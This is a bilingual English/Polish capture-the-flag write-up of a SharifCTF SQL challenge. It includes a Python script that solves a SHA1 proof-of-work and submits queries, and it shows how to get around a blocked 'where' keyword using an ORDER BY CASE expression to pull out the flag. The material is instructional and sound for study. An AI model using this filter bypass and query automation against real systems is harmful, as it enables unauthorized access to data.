﻿## sql (pwn, 150p)

> our website executes your postgresql queries. and flags are nicely formatted. 

###eng
[pl](#pl-version)

we are given address of webpage that executes our queries on ctf database. there is flag we are looking for in that database. looks like that challenge is trivial, doesn't it?


[image extracted text: you can rn sql queries with some limitations_
for each request; you must provide
proof-of-work; namely pow; which can satisfy this expression: substr(shal (spow
snonce) , 0, 5) ===
ooooo"
vonce: 7561628734
proof of worki
queryl
run]


unfortunatelly, there are two problems:
 * we have to present pow (proof of work) before each request
 * query can't contain where, because otherwise engine will refuse to execute it

whatever, we start with getting column and table names from information_schema. we used simple script for that:

```python
import requests, hashlib, time, sys

def query(sql):
    r=requests.get("http://ctf.sharif.edu:36455/chal/sql/")
    nonce=r.text.split("\n")[7].split(" ")[1]
    i=1
    s=""
    print "looking for collision"
    start=time.time()
    while true:
        if i%1000000==0:
            print i
            print time.time()-start, "s"
        s=str(i)+nonce
        m=hashlib.sha1()
        m.update(s)
        if m.hexdigest()[0:5]=="00000":
            break
        i+=1
    print "found collision: "+str(i)
    r=requests.post("http://ctf.sharif.edu:36455/chal/sql/", cookies=r.cookies,
            data={ "pow":str(i), "sql":sql } )
    print r.text
        

query(sys.argv[1])
```

where may be forbidden, but order by is not, so we can easily substitute where by it, using order by (case when condition then 1 else 0 end).

implementing that idea...

    python hack.py "select * from messages order by (case when msg like '%sharif%' then 1 else 0 end) desc"

    ...

    <td>95321145</td>
    <td>sharifctf{f1c16ea7b34877811e4662101b6a0d30}</td>
    <td>1</td>

chalegne solved

###pl version

jest podany adres strony, która uruchamia nasze zapytania sql na bazie ctfa. w bazie jest flaga. czy może być prościej?


[image extracted text: you can rn sql queries with some limitations_
for each request; you must provide
proof-of-work; namely pow; which can satisfy this expression: substr(shal (spow
snonce) , 0, 5) ===
ooooo"
vonce: 7561628734
proof of worki
queryl
run]


niestety, są dwa utrudnienia:
 * trzeba przedstawiać pow przed każdym requestem
 * zaptytanie nie może zawierać "where" (bo inaczej jest odrzucane)

tak czy inaczej, zaczynamy od zapytanie o kolumny i istniejące tabele (do tabeli information_schema), używając prostego skryptu:

```python
import requests, hashlib, time, sys

def query(sql):
    r=requests.get("http://ctf.sharif.edu:36455/chal/sql/")
    nonce=r.text.split("\n")[7].split(" ")[1]
    i=1
    s=""
    print "looking for collision"
    start=time.time()
    while true:
        if i%1000000==0:
            print i
            print time.time()-start, "s"
        s=str(i)+nonce
        m=hashlib.sha1()
        m.update(s)
        if m.hexdigest()[0:5]=="00000":
            break
        i+=1
    print "found collision: "+str(i)
    r=requests.post("http://ctf.sharif.edu:36455/chal/sql/", cookies=r.cookies,
            data={ "pow":str(i), "sql":sql } )
    print r.text
        

query(sys.argv[1])
```

o ile where jest zakazane, to order by nie jest, więc można łatwo uzyskać interesujący nas rekord używając order by (case when warunek then 1 else 0 end).

implementując ten pomysł...

    python hack.py "select * from messages order by (case when msg like '%sharif%' then 1 else 0 end) desc"

    ...

    <td>95321145</td>
    <td>sharifctf{f1c16ea7b34877811e4662101b6a0d30}</td>
    <td>1</td>

zadanie zrobione.
